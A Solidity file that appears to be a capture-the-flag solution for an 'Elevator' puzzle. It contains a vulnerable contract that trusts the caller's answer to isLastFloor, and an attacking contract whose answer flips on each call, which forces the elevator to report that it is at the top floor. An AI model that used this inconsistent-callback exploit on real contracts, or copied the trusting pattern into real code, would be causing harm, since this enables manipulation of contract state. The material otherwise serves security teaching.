// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256 _floor) external returns (bool);
}

interface IElevator {
    function top() external returns (bool);

    function floor() external returns (bool);

    function goTo(uint256 _floor) external;
}

contract BuildingHach is Building {
    IElevator target;

    bool called = false;

    constructor(address _target) {
        target = IElevator(_target);
    }

    function isLastFloor(uint256 _floor) external override returns (bool) {
        bool res = called;
        called = !called;
        return res;
    }

    function goTo(uint256 _floor) public {
        target.goTo(_floor);

        require(target.top(), "failed");
    }
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
